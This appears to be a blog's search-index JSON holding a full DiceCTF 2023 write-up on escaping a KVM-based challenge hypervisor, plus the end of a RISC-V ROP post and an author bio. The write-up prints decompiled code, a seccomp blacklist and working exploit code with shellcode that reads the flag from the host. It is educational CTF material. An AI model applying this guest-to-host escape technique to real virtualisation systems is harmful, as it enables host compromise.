does not fit into the 300 bytes that we can write. when we execute our rop chain, we get the flag!\n","title":"ROPing on RISC-V - hack-a-sat23"},{"date":"2023-02-10","image":"/post-resources/pacman.png","imageAlt":"","link":"https://chalkiadakis.me/posts/dicectf23/dice-visor/","summary":"Surviving the trip from userland, to kernel, to hypervisor.","tags":["ctf","diceCTF","hypervisor","pwn"],"text":"categories: pwn\ndescription:\nwelcome to dicegang\u0026rsquo;s newest hypervisor-based security solution, dicer-visor.\nnc mc.ax 31313\nauthor: smoothhacker\ninitramfs.cpio.gz dicer-visor bzimage\nrecon for this challenge, we are given 3 files: a kernel image, an initramfs, and the dicer-visor binary which is the hypervisor itself.\nfane@ctf-box:~/dicer-visor$ file dicer-visor dicer-visor: elf 64-bit lsb pie executable, x86-64, version 1 (sysv), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, buildid[sha1]=f9ef7fc5756088242c50b7f6b1dbee7ccee624de, for gnu/linux 3.2.0, not stripped fane@ctf-box:~/dicer-visor$ ./dicer-visor usage: ./dicer-visor \u0026lt;bzimage\u0026gt; \u0026lt;initrd\u0026gt; let\u0026rsquo;s run the challenge locally:\nfane@ctf-box:~/dicer-visor$ ./dicer-visor bzimage initramfs.cpio.gz dicer-visor - dicegang security hypervisor [*] created vm [*] loaded kernel image: bzimage [*] loaded initrd image: initramfs.cpio.gz [*] starting up vm booting from rom... [ 0.000000] linux version 6.0.0 (scott@blackrock) (gcc (ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, gnu 3 [ 0.000000] command line: console=ttys0 nokaslr [ 0.000000] x86/fpu: supporting xsave feature 0x001: \u0026#39;x87 floating point registers\u0026#39; [ 0.000000] x86/fpu: supporting xsave feature 0x002: \u0026#39;sse registers\u0026#39; ... [ 0.468004] run /init as init process /init: line 7: can\u0026#39;t create /sys/module/rcutree/parameters/rcu_cpu_stall_suppress: nonexistent directy [ 0.528008] vuln: loading out-of-tree module taints kernel. [ 0.532008] [!] vulnerable driver loaded /bin/sh: can\u0026#39;t access tty; job control turned off / # uname -a linux (none) 6.0.0 #15 fri feb 3 13:31:55 utc 2023 x86_64 gnu/linux / # so, the binary spawns a vm with the given initramfs and drops us to a shell. the vm is running a kernel version 6.0.0 and from the logs we also see that it loads a weird kernel module ([!] vulnerable driver loaded). inside the initramfs, we find the vuln.ko kernel module which we will analyze in a bit. we also can see the contents of init:\n/ # cat init #!/bin/sh #mount -t proc none /proc #mount -t sysfs none /sys #mount -t debugfs none /sys/kernel/debug echo 1 \u0026gt; /sys/module/rcutree/parameters/rcu_cpu_stall_suppress /sbin/insmod /vuln.ko mknod /dev/exploited-device c 32 0 exec /bin/sh / # interesting! the vuln.ko kernel module is loaded and the character device /dev/exploited-device is created. but what is the exploitation strategy here? probably we need to interact with vuln.ko from inside the vm, which in turn will interact with the hypervisor, and we have to exploit that latter interaction. let\u0026rsquo;s also try running on remote:\nwhen we connect to the remote, it asks us for a url to download an initramfs and then spawns the vm. when providing the original initramfs, after the vm loads, we get a kernel panic, probably crashing at exec /bin/sh in init. this is because on the remote side they probably have deleted the contents of /bin/* to avoid easy exploitation. so, let\u0026rsquo;s start analyzing the challenge files.\nanalysis - vuln.ko first, let\u0026rsquo;s extract the initramfs and load the vuln.ko in ghidra. we first analyze the entry and exit points of the kernel module which are init_module and cleanup_module respectively:\nvoid init_module(void) { long lvar1; __register_chrdev(0x20,0,0x100,\u0026#34;exploited-device\u0026#34;,fops); lvar1 = __request_region(\u0026amp;ioport_resource,0xdead,1,\u0026#34;exploited-device\u0026#34;,0); if (lvar1 == 0) { _printk(\u0026#34;\\x011[!] io port allocation of 0x%x failed\\n\u0026#34;,0xdead); } else { lvar1 = __request_region(\u0026amp;ioport_resource,0xd1ce,1,\u0026#34;exploited-device\u0026#34;,0); if (lvar1 == 0) { _printk(\u0026#34;\\x011[!] io port allocation of 0x%x failed\\n\u0026#34;,0xd1ce); } else { _printk(\u0026#34;\\x011[!] vulnerable driver loaded\\n\u0026#34;); } } __x86_return_thunk(); return; } void cleanup_module(void) { __x86_return_thunk(); return; } as we can see, the init_module creates the character device /dev/exploited-device with major number 32, base minor 0, and 0x100 minor numbers available to it (docs/__register_chrdev). next, it creates to regions for this device, both with size 1 byte. the first region is ad address 0xdead and the second region at address 0xd1ce (docs/__request_region).\nthe fops variable in __register_chrdev(), is a global variable that defines what operations are allowed on the character devices and how it should behave under these operations. usually, userland applications interact with the device through the /dev filesystem and file descriptors. from the init file, you should recall the line mknod /dev/exploited-device c 32 0, which makes a special character device with the same major and minor numbers as in the __register_chrdev() call.\nback to the fops variable. this variable is of type struct file_operations and is basically a big list of function pointers. these function pointers describe how the character device behaves when interacted as a file through /dev/exploited-device, e.g. via open, read, ioctl, etc.\nso, let\u0026rsquo;s examine all the registered function pointers in fops:\nchar shellcode[256]; //global variable int open(struct inode *, struct file *) { return 0; } void release(struct inode *, struct file *) { return 0; } ssize_t read(struct file *, char __user *, size_t, loff_t *) { return 0; } ssize_t write(struct file *, const char __user * __buf, size_t __n, loff_t *) { size_t copy_sz; ssize_t svar1; copy_sz = min(__n, 0x100); _copy_from_user(shellcode,__buf,copy_sz); svar1 = __x86_return_thunk(); return svar1; } void tl_ioctl(struct file *file, unsigned int cmd, unsigned long) { long i; _printk(\u0026#34;\\x011[!] driver ioctl issued - cmd: %d\\n\u0026#34;, cmd); if (cmd == 0xbeef) { out(0xd1ce,0xd1ce); //out dx,ax native_io_delay(); } else if (cmd == 0xdead) { for(i=0; i\u0026lt;0x100; i++) { out(0xdead,shellcode[i]); //out dx,al native_io_delay(); } } return 0; } so, to summarize the above operations:\nopen: noop. release: noop read: noop write: writes to the global shellcode kernel buffer up to 0x100 bytes provided by the userland buf. ioctl: the out that appear in the body of the function, are x86-specific assembly instructions. these instructions are used for port i/o, i.e. communication with hardware peripherals. since we are running inside a vm, we expect that these instructions will cause a trap to the hypervisor. (usually the vm runs at a lower privilege level than these instructions can be executed [1, 2, 3]) so, the ioctl command 0xbeef writes to the i/o port 0xd1ce the value d1ce; and the iotctl command 0xdead writes to the i/o port 0xdead the shellcode buffer (0x100 bytes). now it\u0026rsquo;s time to analyze the hypervisor!\nanalysis - dice-visor fane@ctf-box:~/dicer-visor$ file dicer-visor dicer-visor: elf 64-bit lsb pie executable, x86-64, version 1 (sysv), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, buildid[sha1]=f9ef7fc5756088242c50b7f6b1dbee7ccee624de, for gnu/linux 3.2.0, not stripped fortunately, the hypervisor still has symbols as it is not stripped. let\u0026rsquo;s start the analysis from the main function:\nint main(int argc,char **argv) { int ivar1; char *err_msg; int aistack72 [2]; int fd; setvbuf(stdout,(char *)0x0,2,0); setvbuf(stdin,(char *)0x0,2,0); setvbuf(stderr,(char *)0x0,2,0); if (argc != 3) { fwrite(\u0026#34;usage: ./dicer-visor \u0026lt;bzimage\u0026gt; \u0026lt;initrd\u0026gt;\\n\u0026#34;,0x28,1,stderr); return -1; } puts(\u0026#34;dicer-visor - dicegang security hypervisor\u0026#34;); fd = open(\u0026#34;/dev/kvm\u0026#34;,0x80002); if (fd == -1) { return err(1, \u0026#34;/dev/kvm\u0026#34;); } else { ivar1 = ioctl(fd,0xae00,0); if (ivar1 == 0xc) { init_vm(aistack72); puts(\u0026#34;[*] created vm\u0026#34;); load_vm((long)aistack72,argv[1],argv[2]); printf(\u0026#34;[*] loaded kernel image: %s\\n\u0026#34;,argv[1]); printf(\u0026#34;[*] loaded initrd image: %s\\n\u0026#34;,argv[2]); puts(\u0026#34;[*] starting up vm\u0026#34;); run_vm(aistack72); cleanup_vm(aistack72); puts(\u0026#34;[*] exited vm\u0026#34;); return 0; } else if (ivar1 != -1) { return err(1,\u0026#34;kvm_get_api_version %d, expected 12\u0026#34;,ivar1); } return err(1, \u0026#34;kvm_get_api_version\u0026#34;); } } as we see, the hypervisors uses the kernel\u0026rsquo;s kvm api to create the virtual machine. init_vm performs a lot of ioctl system calls, while load_vm does not perform any ioctl and simply mmaps the bzimage and the initramfs, sets some state variables in aistack72, and then returns. the value 0xae00 in the ioctl, corresponds to the #define kvm_get_api_version _io(kvmio, 0x00), where kvmio holds the value 0xae. with a little bit of manual reverse engineering effort, we recover the struct for aistack72 and also have a clean decompilation of the whole hypervisor:\n// ghidra-kvm.h contains struct definitions and macro #defines related to the kvm api. // extracted from the source code of the linux kernel. // e.g. from https://elixir.bootlin.com/linux/v6.0/source/include/uapi/linux/kvm.h // consult the kernel source code and its documentation for what the structs are. // file located in solution/ghidra-kvm.h #include \u0026#34;ghidra-kvm.h\u0026#34; struct vm { int vm_fd; int vcpu_fd; int kvm_fd; undefined[4] padding; void *userspace_address; } undefined8 init_vm(struct vm *vm); undefined8 load_vm(struct vm *vm,char *bzimage_path,char *initramfs_path); undefined8 run_vm(struct vm *vm); undefined8 cleanup_vm(struct vm *vm); int main(int argc,char **argv) { int ivar1; char *pcvar2; struct vm vm; setvbuf(stdout,(char *)0x0,2,0); setvbuf(stdin,(char *)0x0,2,0); setvbuf(stderr,(char *)0x0,2,0); if (argc != 3) { fwrite(\u0026#34;usage: ./dicer-visor \u0026lt;bzimage\u0026gt; \u0026lt;initrd\u0026gt;\\n\u0026#34;,0x28,1,stderr); return -1; } puts(\u0026#34;dicer-visor - dicegang security hypervisor\u0026#34;); vm.kvm_fd = open(\u0026#34;/dev/kvm\u0026#34;,0x80002); if (vm.kvm_fd == -1) { return err(1, \u0026#34;/dev/kvm\u0026#34;); } else { ivar1 = ioctl(vm.kvm_fd,kvm_get_api_version ,0); if (ivar1 == 0xc) { init_vm(\u0026amp;vm); puts(\u0026#34;[*] created vm\u0026#34;); load_vm(\u0026amp;vm,argv[1],argv[2]); printf(\u0026#34;[*] loaded kernel image: %s\\n\u0026#34;,argv[1]); printf(\u0026#34;[*] loaded initrd image: %s\\n\u0026#34;,argv[2]); puts(\u0026#34;[*] starting up vm\u0026#34;); run_vm(\u0026amp;vm); cleanup_vm(\u0026amp;vm.vm_fd); puts(\u0026#34;[*] exited vm\u0026#34;); return 0; } else if (ivar1 != -1) { return err(1,\u0026#34;kvm_get_api_version %d, expected 12\u0026#34;,ivar1); } return err(1,\u0026#34;kvm_get_api_version\u0026#34;); } } /* warning: could not reconcile some variable overlaps */ undefined8 init_vm(struct vm *vm) { int ivar1; void *userspace_addr; char *pcvar2; undefined8 local_70; struct kvm_userspace_memory_region kvm_userspace_memory_region; kvm_pit_config kvm_pit_config; ivar1 = ioctl(vm-\u0026gt;kvm_fd,kvm_create_vm ,0); vm-\u0026gt;vm_fd = ivar1; if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] vm creation failed\u0026#34;; } else { ivar1 = ioctl(ivar1,kvm_set_tss_addr,0xfffbd000); if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] failed to set tss addr\u0026#34;; } else { local_70 = 0xffffc000; ivar1 = ioctl(vm-\u0026gt;vm_fd,kvm_set_identity_map_addr,\u0026amp;local_70); if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] failed to set identity map addr\u0026#34;; } else { ivar1 = ioctl(vm-\u0026gt;vm_fd,kvm_create_irqchip,0); if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] failed to create irq chip\u0026#34;; } else { kvm_pit_config.pad._44_16_ = zext816(0); kvm_pit_config.pad._28_16_ = zext816(0); kvm_pit_config.pad._12_16_ = zext816(0); kvm_pit_config._0_16_ = zext816(0); ivar1 = ioctl(vm-\u0026gt;vm_fd,kvm_create_pit2,\u0026amp;kvm_pit_config); if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] failed to create i8254 interval timer\u0026#34;; } else { userspace_addr = mmap(null,0x10000000,3,0x4021,-1,0); vm-\u0026gt;userspace_address = userspace_addr; if (userspace_addr == null) { pcvar2 = \u0026#34;[!] failed to mmap vm memory\u0026#34;; } else { kvm_userspace_memory_region._0_8_ = 0x100000000; kvm_userspace_memory_region.guest_phys_addr._0_4_ = 0; kvm_userspace_memory_region.guest_phys_addr._4_4_ = 0; kvm_userspace_memory_region.memory_size._0_4_ = 0x10000000; kvm_userspace_memory_region.memory_size._4_4_ = 0; kvm_userspace_memory_region.userspace_addr = (ulong)userspace_addr; ivar1 = ioctl(vm-\u0026gt;vm_fd,kvm_set_user_memory_region,\u0026amp;kvm_userspace_memory_region); if (ivar1 \u0026lt; 0) { pcvar2 = \u0026#34;[!] failed to set user memory region\u0026#34;; } else { ivar1 = ioctl(vm-\u0026gt;vm_fd,kvm_create_vcpu,0); vm-\u0026gt;vcpu_fd = ivar1; if (-1 \u0026lt; ivar1) { initvmregs(vm); createcpuid(vm); return 0; } pcvar2 = \u0026#34;[!] failed to create vcpu\u0026#34;; } } } } } } } err(1,pcvar2); } void *jit_mem; int jit_mem_counter; undefined8 run_vm(struct vm *vm) { int ivar1; kvm_run *vcpu; long idx; undefined seccomp_filter[]; //length omitted ushort port; ivar1 = ioctl(vm-\u0026gt;kvm_fd,kvm_get_vcpu_mmap_size,0); vcpu = (kvm_run *)mmap(null,ivar1,prot_read|prot_write,map_shared,vm-\u0026gt;vcpu_fd,0); jit_mem = (code *)mmap(null,0x100,prot_read|prot_write|proc_exec, map_shared|map_anonymous|map_noreserve,-1,0 ); jit_mem_counter = 0; /* init seccomp_filter */ /* ... */ //set seccomp filter ivar1 = prctl(pr_set_no_new_privs,1,0,0,0); if (ivar1 != 0) { perror(\u0026#34;prctl(no_new_privs)\u0026#34;); } ivar1 = prctl(pr_set_seccomp,2,seccomp_filter); if (ivar1 != 0) { close(vm-\u0026gt;vcpu_fd); close(vm-\u0026gt;vm_fd); close(vm-\u0026gt;kvm_fd); munmap(vm-\u0026gt;userspace_address,0x40000000); perror(\u0026#34;prctl(seccomp)\u0026#34;); //bug? if the seccomp filter fails, then we still attempt to execute the remaining of this function. //but the file descriptors have been closed and memory has been unmapped. oh well.. } //run the vm ivar1 = ioctl(vm-\u0026gt;vcpu_fd,kvm_run,0); while( true ) { if (ivar1 \u0026lt; 0) { return err(1,\u0026#34;kvm_run failed\u0026#34;); } if (vcpu-\u0026gt;exit_reason != kvm_exit_io) break; /* union case: kvm_exit_io */ port = vcpu-\u0026gt;unlabelled32.io.port; //vcpu-\u0026gt;unlabelled32.io.port if ((short)port \u0026lt; 0x61) { if (port == 0xd1ce) { (*jit_mem)(); } else if ((port == 0xdead) \u0026amp;\u0026amp; (vcpu-\u0026gt;unlabelled32.io.direction == kvm_exit_io_out)) { idx = (long)jit_mem_counter; if (idx \u0026lt;= 0x100) { //unintended off-by-one. jit_mem_counter++; jit_mem[idx] = *((char*)vcpu + vcpu-\u0026gt;unlabelled32.io.data_offset); } else { puts(\u0026#34;[!] maximum bytes read from guest\u0026#34;); } } } else if (port == 0x61 \u0026amp;\u0026amp; vcpu-\u0026gt;unlabelled32.io.direction == kvm_exit_io_in) { *((char*)vcpu + vcpu-\u0026gt;unlabelled32.io.data_offset) = \u0026#39;d\u0026#39;; } else if (port == 0x3fd \u0026amp;\u0026amp; vcpu-\u0026gt;unlabelled32.io.direction == kvm_exit_io_in) { *((char*)vcpu + vcpu-\u0026gt;unlabelled32.io.data_offset) = \u0026#39; \u0026#39;; } else if ((port == 0x3f8) \u0026amp;\u0026amp; (vcpu-\u0026gt;unlabelled32.io.direction == kvm_exit_io_out)) { write(1, (char*)vcpu + vcpu-\u0026gt;unlabelled32.io.data_offset, 1); } ivar1 = ioctl(vm-\u0026gt;vcpu_fd,kvm_run,0); //continue the vm } printf(\u0026#34;[!] unknown exit reason: %d\\n\u0026#34;, vcpu-\u0026gt;exit_reason); return -1; } undefined8 cleanup_vm(struct vm *vm) { close(vm-\u0026gt;vcpu_fd); close(vm-\u0026gt;vm_fd); close(vm-\u0026gt;kvm_fd); munmap(vm-\u0026gt;userspace_address,0x40000000); return 0; } the run_vm now is quite self-explanatory and interesting. as we recall from the vuln.ko, there were two out x86 instructions that we could invoke: out(0xd1ce,0xd1ce) and out(0xdead,shellcode[i]). from the hypervisor\u0026rsquo;s code, we can see that when the port is 0xd1ce, the contents of the jit_mem are executed. when the port is 0xdead, we write to the jit_mem the value of the source operand from the out x86 instructions. so, to sum it up:\nwrite syscall to the /dev/exploited-device: writes up to 0x100 bytes to the kernel\u0026rsquo;s shellcode buffer from a userland provided buffer. ioctl cmd 0xdead: out(0xdead, shellcode[i]). writes the 0x100 bytes from the kernel\u0026rsquo;s shellcode buffer to the hypervisor\u0026rsquo;s jit_mem. may be called only once. (otherwise you get the message \u0026ldquo;maximum bytes read from guest\u0026rdquo;.) ioctl cmd 0xbeef: out(0xd1ce,0xd1ce). will execute the contents in the jit_mem buffer. i.e. it will execute the shellcode provided from userland. seccomp filter one last thing to notice about run_vm, is that it sets up a seccomp filter. using seccomp-tools, we can easily dump it:\nfane@ctf-box:~/dicer-visor$ seccomp-tools dump \u0026#34;./dicer-visor bzimage initramfs.cpio.gz\u0026#34; dicer-visor - dicegang security hypervisor [*] created vm [*] loaded kernel image: bzimage [*] loaded initrd image: initramfs.cpio.gz [*] starting up vm line code jt jf k ================================= 0000: 0x20 0x00 0x00 0x00000004 a = arch 0001: 0x15 0x01 0x00 0xc000003e if (a == arch_x86_64) goto 0003 0002: 0x06 0x00 0x00 0x00000000 return kill 0003: 0x20 0x00 0x00 0x00000000 a = sys_number 0004: 0x15 0x00 0x01 0x00000029 if (a != socket) goto 0006 0005: 0x06 0x00 0x00 0x80000000 return kill_process 0006: 0x15 0x00 0x01 0x00000039 if (a != fork) goto 0008 0007: 0x06 0x00 0x00 0x80000000 return kill_process 0008: 0x15 0x00 0x01 0x00000021 if (a != dup2) goto 0010 0009: 0x06 0x00 0x00 0x80000000 return kill_process 0010: 0x15 0x00 0x01 0x00000142 if (a != execveat) goto 0012 0011: 0x06 0x00 0x00 0x80000000 return kill_process 0012: 0x06 0x00 0x00 0x7fff0000 return allow so, this is a blacklist of socket, fork, dup2, and execveat system calls. however, we can still use open and write, and the remote provides us the output of the hypervisor!\nexploitation so, let\u0026rsquo;s create a userland program that when executed performs the trip to the hypervisor and executes some shellcode:\n//main.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; const char *shellcode = \u0026#34;\\x90\\x90\\x90\\x90\u0026#34;; //4x \u0026#34;nop\u0026#34; instruction const size_t shellcode_len = 4; int main(int argc, char ** argv) { int fd = open(\u0026#34;/dev/exploited-device\u0026#34;, o_rdwr); if(fd == -1) { perror(\u0026#34;open\u0026#34;); exit(1); } ssize_t res = write(fd, shellcode, shellcode_len); if(res != shellcode_len) { printf(\u0026#34;write error. written: %ld\\n\u0026#34;, res); exit(1); } if ( (res = ioctl(fd, 0xdead)) \u0026lt; 0) { //write shellcode to supervisor perror(\u0026#34;ioctl1\u0026#34;); exit(1); } if ( (res = ioctl(fd, 0xbeef)) \u0026lt; 0) { //invoke shellcode perror(\u0026#34;ioctl2\u0026#34;); exit(1); } return 0; } next, let\u0026rsquo;s write a script that builds our userland program and re-creates the initramfs:\n#!/bin/sh set -e gcc -static main.c -o main mv main initramfs cd initramfs find . -print0 | cpio --null --create --verbose --format=newc | gzip --best \u0026gt; ../initramfs_patched.cpio.gz cd - finally, we modify the init script to invoke our main program when the kernel boots:\n#!/bin/sh echo 1 \u0026gt; /sys/module/rcutree/parameters/rcu_cpu_stall_suppress echo \u0026#34;hello kernel world!\u0026#34; /sbin/insmod /vuln.ko mknod /dev/exploited-device c 32 0 chmod ugo+x /main exec /main shellcode generation to generate our shellcode and dump the flag, we use pwntools\n# gen-shellcode.py from pwn import * # set up pwntools for the correct architecture. context.binary = elfexe = elf(\u0026#39;./dicer-visor\u0026#39;) def dumpshellcode(shellcode): shellcode_str = \u0026#39;\u0026#39; for b in shellcode: shellcode_str += \u0026#34;\\\\x{:02x}\u0026#34;.format(b) msg = f\u0026#39;const char *shellcode = \u0026#34;{shellcode_str}\u0026#34;;\\n\u0026#39; msg += f\u0026#39;const size_t shellcode_len = {len(shellcode)};\u0026#39; print(msg) shellcode = asm( \u0026#39;\u0026#39;\u0026#39; xor rdx, rdx /* o_rdonly */ \u0026#39;\u0026#39;\u0026#39; + pwnlib.shellcraft.linux.cat(\u0026#34;flag.txt\u0026#34;) ) dumpshellcode(shellcode) when we execute python gen-shellcode.py, we get our c-style formatted shellcode which we can plug into our main.c:\nfane@ctf-box:~/dicer-visor$ python gen-shellcode.py const char *shellcode = \u0026#34;\\x48\\x31\\xd2\\x6a\\x01\\xfe\\x0c\\x24\\x48\\xb8\\x66\\x6c\\x61\\x67\\x2e\\x74\\x78\\x74\\x50\\x6a\\x02\\x58\\x48\\x89\\xe7\\x31\\xf6\\x0f\\x05\\x41\\xba\\xff\\xff\\xff\\x7f\\x48\\x89\\xc6\\x6a\\x28\\x58\\x6a\\x01\\x5f\\x99\\x0f\\x05\u0026#34;; const size_t shellcode_len = 47; getting the flag finally we run build.sh to create the initramfs_patched.cpio.gz that contains the modified init script and our main binary. when we connect to the remote and provide our initramfs_patched.cpio.gz for the hypervisor to use, our userland program gets executed when the kernel boots, we perform the trip to the hypervisor, and dump the contents of flag.txt!\ndice{dicer-visor-rules}\n","title":"Pwning a hypervisor - DiceCTF23"},{"date":"0001-01-01","image":"","imageAlt":"","link":"https://chalkiadakis.me/whoami/","summary":"\u003cstyle\u003e\n.single-row {\n  margin-bottom: 0.37em;\n}\n.single-row input[type=\"checkbox\"] {\n  display: none;\n}\n\n.content {\n  max-height: 0;\n  overflow: hidden;\n  -webkit-transition: max-height 250ms ease-in-out;\n  -moz-transition: max-height 250ms ease-in-out;\n  -o-transition: max-height 250ms ease-in-out;\n  transition: max-height 250ms ease-in-out;\n  /* background-color: var(--default_hl_bg); */\n}\n\n.moddedfa {\n  margin-right: 1em;\n  /* margin-left: 1em; */\n  -webkit-transform: rotate(-90deg);\n  -moz-transform: rotate(-90deg);\n  -o-transform: rotate(-90deg);\n  transform: rotate(-90deg);\n  -webkit-transition: -webkit-transform 250ms ease-in-out;\n  -moz-transition: -moz-transform 250ms ease-in-out;\n  -o-transition: -o-transform 250ms ease-in-out;\n  transition: transform 250ms ease-in-out;\n}\n\n.opener:checked+label+div.content {\n  display: block;\n  max-height: 350px;\n}\n\n.opener:checked+label .moddedfa {\n  -webkit-transform: rotate(0) translate(0, -3px);\n  -moz-transform: rotate(0) translate(0, -3px);\n  -o-transform: rotate(0) translate(0, -3px);\n  transform: rotate(0) translate(0, -3px);\n}\n\n.content ul {\n  margin-top: 0px;\n}\n\u003c/style\u003e\n\u003cp\u003eHi! I am \u003cstrong\u003eNikolaos Chalkiadakis\u003c/strong\u003e and I work in the Application Security field. I have extensive knowledge and work experience in \u003cstrong\u003eMobile Security\u003c/strong\u003e, \u003cstrong\u003eAndroid internals\u003c/strong\u003e, \u003cstrong\u003ereverse engineering\u003c/strong\u003e, \u003cstrong\u003ebinary exploitation\u003c/strong\u003e, and \u003cstrong\u003ekernel development\u003c/strong\u003e. I usually post about low-level exploitation with the goal to spread knowledge and to maybe help someone learn something new.\u003c/p\u003e","tags":[],"text":" hi! i am nikolaos chalkiadakis and i work in the application security field. i have extensive knowledge and work experience in mobile security, android internals, reverse engineering, binary exploitation, and kernel development. i usually post about low-level exploitation with the goal to spread knowledge and to maybe help someone learn something new.\noccasional ctf player (pwn/rev/web)\nintense consumer, addicted to ⛷️\neducation 2023 | m.sc. in computer science 9.00/10.0 | vu amsterdam, uva \u0026nbsp; (netherlands) thesis: spaceforce: spatial and partially temporal heap protection with tagged buffed pointers @ vusec postgraduate scholarship vu fellowship programme (vufp) followed the computer systems security track noteworthy attended courses: computer and network security binary and malware analysis hardware security advanced operating systems software containerization 2019 | b.sc. in computer science 9.45/10.0 | university of crete (greece) thesis: the million dollar handshake: secure and attested communications in the cloud @ discs lab - forth-ics undergraduate scholarship stelios orfanoudakis noteworthy attended courses: embedded systems lab parallel programming principles of distributed computing skills languages: c, c++, x86_64 and aarch64 assembly, java, kotlin, smali, python\ntooling: android stuff (apps, custom native tools, kernel modules, etc.), frida scripting, gdb scripting, ghidra scripting, ida, jeb, pwntools, angr, intel pin, burp suite, wireshark, docker, qemu, git\n","title":"About me"}]}